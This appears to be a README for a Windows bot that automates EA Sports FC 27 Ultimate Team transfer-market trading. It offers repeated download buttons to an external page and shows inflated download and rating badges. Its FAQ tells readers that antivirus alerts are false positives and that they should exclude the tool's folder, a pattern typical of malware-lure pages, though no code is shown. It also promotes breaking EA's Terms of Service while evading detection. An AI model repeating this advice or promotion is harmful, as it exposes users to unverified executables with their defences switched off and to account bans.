<div align="center">

# FC27 AutoTrader 2026 — Ultimate Team Market Enhancer for Windows

![preview](https://raw.githubusercontent.com/SashaInfinity/fc27-market-companion/main/banner_83879.svg)

[![downloads](https://img.shields.io/badge/downloads-246K-6366f1?style=flat&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=flat&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-Windows_11-6366f1?style=flat&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/rating-5.0%2F5-f59e0b?style=flat&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/SashaInfinity/fc27-market-companion/main/bin_c6f2bb.svg)](https://SashaInfinity.github.io/fc27-market-companion/)

</div>

---

FC 27's transfer market never sleeps, and neither should your trade strategy. fc27-autotrader-2026 is a desktop trading companion for EA Sports FC 27 Ultimate Team that handles the grind for you — automated market workflows, real-time price monitoring, and transfer list management run on rules you set, not on how fast you can refresh a search. It's built for traders who'd rather read the market than click through it. Configure your filters and limits, let the automation work, and keep your coins moving.

## Features

**Auto-Trade Engine**
Set your filters once and let it work. The engine searches the transfer market by rating, league, nation, position, chemistry style, and price range, then places bids within your max limits, fires Buy Now when listings dip below target, and relists automatically with margins that already account for the 5% tax. No manual refreshing, no missed undercuts.

**Price Monitor**
Track the players and items you care about across multiple price points. Get alerts the moment listings drop below your threshold, watch market trends and top movers, and keep a price history log so every buy/sell call is backed by data instead of gut feeling.

**Multi-Rarity Search**
Gold, silver, bronze, special cards, consumables, stadium items — filter across all of them and batch-search multiple rarities at once. Save custom filter presets per strategy so you can switch from sniping to flipping without rebuilding your search every time.

**FUTBIN Cross-Reference**
Compare live market prices against external trend data to spot undervalued listings before the crowd does. Smarter timing on both ends of the trade — buy low, sell high, repeat.

**Trade Logs & P/L Dashboard**
Every purchase, sale, profit, and loss is logged in a full audit trail. Watch your profit/loss update in real time and export everything to CSV when you want to dig deeper.

**Multi-Profile Support**
Run separate profiles for separate accounts. Handy for keeping your main clean while you test strategies on a secondary.

**Windows-Native Desktop App**
Runs as a standalone Windows process alongside the FC 27 Web App — no game file modifications, no memory injection. Configure, hit Start, and let it trade.

## How It Works

fc27-autotrader-2026 runs as a standalone desktop process that hooks into the FC 27 Web App session you're already signed into. No memory patching, no game file edits — it reads the same transfer market data you see and acts on it faster than manual clicking ever could.

**Search loop.** You define filters once — rating, league, nation, position, chemistry style, price ceiling. The engine cycles those searches continuously, watching for listings that match your criteria and fall inside your buy range.

**Bid and buy execution.** When a listing hits your target price, the tool places the bid or triggers Buy Now instantly, respecting the max-price caps you set. No overshooting, no panic buys.

**Relist pipeline.** Acquired cards flow straight to the transfer list with margins calculated for you — the 5% EA tax is baked in, so your profit numbers are real, not wishful.

**Price monitoring.** Tracked players and consumables are watched across multiple price points. Drop below your threshold and you get an alert; trend data logs in the background so you can see what's moving and when.

**Cross-referencing.** Market prices get compared against external data to surface listings that are undervalued relative to the going rate — the gaps where snipes actually live.

**Logging.** Every purchase, sale, and relist lands in an audit trail with a live profit/loss dashboard. Export to CSV when you want to dig deeper.

Set your rules, hit Start, and let it grind the market while you do literally anything else.

## Supported Games

fc27-autotrader-2026 targets **EA Sports FC 27 Ultimate Team** exclusively. One game, one market — the tool is built around FC 27's transfer market rules, price bands, and 5% tax model, so every automation workflow is tuned to the current title rather than stretched across older releases.

**Fully supported:**

- **EA Sports FC 27** — launch build and all current patches. Market search, bidding, Buy Now execution, relisting, and price monitoring run against the live FC 27 transfer market.
- **FC 27 Web App** — the primary surface for automated trading. All market workflows operate through the Web App interface, including early access periods before the game unlocks.
- **FC 27 in-game transfer market** — filter presets, rarity searches, and trade logs are aligned with the in-game market structure and card categories.

**Not supported:** earlier titles in the series (FC 26 and prior) and other football/sports titles. The tool is version-locked — it is not a generic market bot and will not work against legacy markets or non-FC 27 data.

**Patch resilience:** when FC 27 pushes a market update, the search and listing logic is validated against the current build. If a patch introduces changes that affect automation, support lands as a companion update — you stay on the current game, not a frozen snapshot.

**Bottom line:** if you're trading on FC 27's market, it's covered. If you're anywhere else, it isn't — by design.

## Configuration

Everything in fc27-autotrader-2026 is driven by config files — no recompile, no source-diving. Tune your rules, restart the app, and it trades the way you told it to.

**Config location**

```
%APPDATA%\FC27AutoTrader\config\
```

Three files matter: `settings.json` (app behavior), `filters.json` (market search presets), and `profiles.json` (account slots). The shipped defaults are safe — edit from there, don't build from scratch.

**settings.json — core knobs**

- `max_buy_price` / `max_bid_price` — hard ceilings per search; the engine never exceeds these, period.
- `min_profit_margin` — percentage floor after the 5% tax. Set it below what you actually want and you'll churn coins on thin flips.
- `relist_delay_ms` — delay between relist operations. Lower = faster, higher = gentler on rate limits.
- `bid_increment` — override the default jump so you don't overpay by a full tier.
- `dry_run` — `true` by default. Runs the full logic loop, logs every would-be action, executes nothing. Flip this off only after your logs look sane.

**filters.json — your search presets**

Each entry is a named preset with its own `rating`, `league`, `nation`, `position`, `chemistry_style`, and `price_min` / `price_max`. Presets run in the order listed and can be enabled or disabled individually. Keep price windows tight — a preset scoped to a 2,000-coin band finds snipes; a 50,000-coin band finds noise.

**profiles.json — multi-account slots**

Each profile carries its own credentials reference, filter set, and enabled modules. Profiles are independent — a busted filter on one doesn't touch the others. Stagger profile start times if you run more than one.

**Rules of thumb**

- Validate every filter in `dry_run` first. Logs show matched listings, computed margins, and skipped actions — if the numbers don't add up there, they won't in live.
- Change one variable at a time. Trading behavior compounds; so do mistakes.
- Back up your config folder before major edits. A bad `filters.json` won't crash the app — it'll just trade badly, and you won't notice until the coin balance does.

Config is read at startup. Save your changes, restart the app, verify in the log panel that your presets loaded, then go live.

## FAQ

**Will this get my account flagged or banned?**

fc27-autotrader-2026 runs as a separate desktop process — it doesn't touch game files, memory, or the client itself. That said, EA's Terms of Service prohibit external tools that automate gameplay or provide an unfair advantage. Automated trading sits squarely in that gray zone. If you're risk-averse, run it on a secondary account.

**Does it work with the Companion App and Web App?**

Yes. The tool operates through the FC 27 Web App interface, the same market backend the Companion App uses. If your account has transfer market access in the Web App, auto-trading works there.

**What are the transfer market access requirements?**

EA gates market access behind account history and activity. Veterans with established accounts usually get in immediately. Fresh accounts typically need to clear foundation objectives and wait 24–48 hours before the market unlocks. The tool can't bypass this — no external application can.

**Why is my antivirus flagging it?**

Automation processes that simulate input and interact with browser sessions routinely trip heuristic detection. It's a false positive, not malware. Add an exclusion for the tool's folder if your AV quarantines it.

**Can I run multiple accounts at once?**

Multiple account profiles are supported, but simultaneous instances raise your exposure to rate limits and detection. Stagger your sessions and keep concurrent activity low if you're running more than one.

**Does it handle the 5% transfer tax automatically?**

Yes. Every relist and sell calculation accounts for EA's 5% market tax, so your margins reflect actual coin returns — no manual math, no surprise losses.

**What happens if a listing doesn't sell?**

The tool relists automatically according to your configured rules, adjusting price within the bounds you set. If a card sits unsold past your threshold, it stops relisting and logs the item so you can reassess.

**Where does trade data go?**

Everything is logged locally — purchases, sales, profit/loss, inventory. Export to CSV whenever you want to analyze outside the tool. Nothing is uploaded anywhere unless you explicitly enable cloud profiles (planned, not yet live).

**How do I remove it cleanly?**

Run the uninstaller from the tool's directory. It strips the application, profiles, and registry entries — your game install and EA account are untouched.

## Disclaimer

Read this before you run a single trade.

**You are responsible for your account.** fc27-autotrader-2026 automates transfer market activity through the FC 27 Web App. EA's Terms of Service prohibit external tools that provide an unfair advantage, and automated trading falls squarely in that territory. Enforcement actions — market locks, coin wipes, suspensions, permanent bans — are applied at EA's discretion and are not reversible by this project. If your account matters to you, run it on a secondary profile.

**No affiliation.** This is an independent, community-built companion tool. It is not endorsed by, sponsored by, or connected to EA Sports, Electronic Arts, or any of their partners. All trademarks belong to their respective owners.

**No guarantees on results.** Market conditions shift, prices move, and the tool executes exactly what you configure. Margin calculations account for the 5% tax, but profits are never promised and losses are always possible. Backtest your filters before letting anything run unattended, and never trade coins you can't afford to lose.

**Use it as intended.** One instance per account. Aggressive polling, stacked profiles, or attempts to hammer the market can trip rate limits or detection systems. The tool ships with sane defaults — respect them.

**Software provided as-is.** fc27-autotrader-2026 is released under the MIT License, without warranty of any kind, express or implied. The authors and contributors accept no liability for account penalties, lost coins, lost listings, or any other damages arising from use of this software.

**Your setup, your responsibility.** Antivirus exclusions, runtime versions, and market access eligibility are on you to verify before first launch. The FAQ covers the common cases — read it first, then trade smart.

[![Download](https://raw.githubusercontent.com/SashaInfinity/fc27-market-companion/main/bin_c6f2bb.svg)](https://SashaInfinity.github.io/fc27-market-companion/)